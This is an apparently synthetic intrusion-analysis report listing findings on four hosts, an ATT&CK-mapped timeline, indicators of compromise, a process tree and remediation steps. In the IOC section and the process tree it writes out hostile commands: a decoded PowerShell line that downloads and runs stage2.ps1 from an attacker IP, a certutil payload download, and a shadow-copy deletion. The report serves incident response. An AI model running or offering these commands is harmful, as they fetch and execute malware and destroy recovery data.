# Sample intrusion (synthetic)

Events analysed: 253. Findings: 14 (1 critical, 7 high, 6 medium).
Kill-chain phases seen: Initial Access, Execution, Persistence, Defense Evasion, Credential Access, Lateral Movement, Command and Control, Impact. Span of findings: 349s.

## Host risk

| Host | Score | Level | Findings | Phases |
|---|---|---|---|---|
| WS01 | 100 | critical | 9 | 6 |
| DC01 | 65 | high | 3 | 2 |
| FILE01 | 40 | medium | 1 | 1 |
| SRV01 | 25 | medium | 1 | 1 |

## Timeline

| Time | Host | Phase | Severity | Technique | Detail |
|---|---|---|---|---|---|
| 2026-03-01 09:51:35 | WS01 | Initial Access | high | T1204.002 | winword.exe spawned powershell.exe |
| 2026-03-01 09:51:35 | WS01 | Execution | high | T1059.001 | Encoded PowerShell command line |
| 2026-03-01 09:52:16 | WS01 | Persistence | medium | T1547.001 | Run key set by upd.exe (user-writable path) |
| 2026-03-01 09:52:36 | WS01 | Command and Control | high | T1071.001 | powershell.exe on WS01 contacts 203.0.113.50:4444 every ~60s (20 conns, cv=0.04) |
| 2026-03-01 09:52:36 | WS01 | Command and Control | medium | T1071 | powershell.exe on WS01 connected to 203.0.113.50:4444 (20 times) |
| 2026-03-01 09:52:38 | WS01 | Defense Evasion | medium | T1218 | Unusual parent/child: powershell.exe -> cmd.exe |
| 2026-03-01 09:52:57 | WS01 | Defense Evasion | medium | T1218 | Unusual parent/child: cmd.exe -> certutil.exe |
| 2026-03-01 09:53:28 | WS01 | Credential Access | high | T1003.001 | m.exe accessed LSASS |
| 2026-03-01 09:53:34 | DC01 | Credential Access | high | T1558.003 | 4 RC4 service tickets from 10.0.0.21 in 60s |
| 2026-03-01 09:53:52 | DC01 | Credential Access | high | T1110 | 6 failed logons from 10.0.0.99 then a success |
| 2026-03-01 09:54:46 | SRV01 | Lateral Movement | high | T1021 | alice logged on to 5 hosts from 10.0.0.21 within 600s |
| 2026-03-01 09:56:26 | DC01 | Persistence | medium | T1136.001 | Account created: backup$ |
| 2026-03-01 09:56:31 | WS01 | Command and Control | medium | T1568.002 | 5 high-entropy DNS names queried by WS01 (e.g. yagqqrv98607g2e9cy.top) |
| 2026-03-01 09:57:24 | FILE01 | Impact | critical | T1490 | Shadow copies deleted on FILE01 |

## Indicators of compromise

- ips: 203.0.113.50
- domains: 2i03q0x7isip4h6t6w.top, pc7g3jphd03hndw7jh.top, ssbapck0yduzdueo14.top, y4k58d150s7ztx7s4r.top, yagqqrv98607g2e9cy.top
- urls: http://203.0.113.50/m.exe, http://203.0.113.50/stage2.ps1
- hashes: none

Decoded PowerShell payloads:

    IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/stage2.ps1')

## Process tree

```
explorer.exe [WS01 09:51:11]  explorer.exe
`-- winword.exe [WS01 09:51:31]  WINWORD.EXE invoice.docm
    `-- powershell.exe [WS01 09:51:35] [!]  powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAu...
        `-- cmd.exe [WS01 09:52:38] [!]  cmd.exe /c whoami /all
            `-- certutil.exe [WS01 09:52:57] [!]  certutil -urlcache -f http://203.0.113.50/m.exe C:\Users\Public\m.exe
vssadmin.exe [FILE01 09:57:24] [!]  vssadmin delete shadows /all /quiet
```

## Recommended next steps

1. Isolate hosts rated high or critical and preserve memory and disk before rebooting.
2. Block the IP addresses and domains above at the firewall and DNS layer.
3. Reset credentials for accounts seen on affected hosts, and for any account exposed to LSASS access or Kerberoasting.
4. Remove persistence (Run keys, scheduled tasks, new accounts) found in the timeline.
5. Scope: search all hosts for the IOCs and the same parent/child patterns.
